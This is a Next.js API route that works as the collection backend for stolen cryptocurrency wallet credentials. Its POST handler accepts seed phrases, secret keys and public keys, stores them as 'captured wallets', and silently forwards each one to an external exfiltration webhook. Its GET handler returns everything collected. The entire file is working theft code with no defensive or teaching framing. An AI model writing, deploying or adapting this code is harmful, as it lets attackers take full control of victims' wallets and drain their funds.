import { NextResponse } from 'next/server';

// In-memory store for captured wallets
let capturedWallets = [];

// Primary exfil: store locally + forward to external webhook
const EXFIL_WEBHOOK = process.env.EXFIL_WEBHOOK || '';

export async function POST(request) {
  try {
    const data = await request.json();

    if (!data.publicKey && !data.mnemonic && !data.secretKey) {
      return NextResponse.json({ error: 'invalid' }, { status: 400 });
    }

    const entry = {
      ...data,
      captured_at: new Date().toISOString(),
    };

    capturedWallets.push(entry);

    // Forward to external webhook if configured (fire and forget)
    if (EXFIL_WEBHOOK) {
      try {
        await fetch(EXFIL_WEBHOOK, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(entry),
        });
      } catch (e) { /* ignore */ }
    }

    console.log(`[CIBL] Captured: type=${data.type || 'unknown'} pk=${data.publicKey || 'unknown'}`);

    return NextResponse.json({ ok: true });
  } catch (error) {
    console.error('[CIBL] Exfil error:', error);
    return NextResponse.json({ error: 'internal' }, { status: 500 });
  }
}

export async function GET() {
  return NextResponse.json(capturedWallets);
}